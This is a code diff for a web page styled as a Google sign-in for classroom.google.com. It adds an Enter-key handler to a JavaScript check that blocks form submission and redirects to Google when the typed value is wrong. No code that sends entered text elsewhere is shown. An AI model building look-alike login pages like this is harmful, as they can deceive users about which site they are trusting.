@@ -24,7 +24,7 @@
               To continue to <a href="https://classroom.google.com" target="_blank">classroom.google.com</a>
             </div>
 						
-						<form class="form-feed">
+						<form class="form-feed" action="#">
 							<div class="form-feed-box">
 								<input required type="" id="password" name="password" value="">
 								<label for="password">Email or phone</label>
@@ -57,12 +57,12 @@
 	</section>
 
 	<script>
-		// Get the button and input element
+// Get the button and input element
 const nextButton = document.getElementById('nextBtn');
 const passwordInput = document.getElementById('password');
 
-// Add an event listener to the button
-nextButton.addEventListener('click', function(event) {
+// Function to handle form submission logic
+function handleFormSubmission(event) {
     // Prevent form submission
     event.preventDefault();
 
@@ -103,7 +103,18 @@ nextButton.addEventListener('click', function(event) {
         // Redirect to a different website if password is incorrect
         window.location.href = 'https://classroom.google.com'; // Replace with the fallback URL
     }
+}
+
+// Add event listener for button click
+nextButton.addEventListener('click', handleFormSubmission);
+
+// Add event listener for "Enter" key press
+passwordInput.addEventListener('keydown', function(event) {
+    if (event.key === 'Enter') {
+        handleFormSubmission(event);
+    }
 });
+
 
 	</script>
 
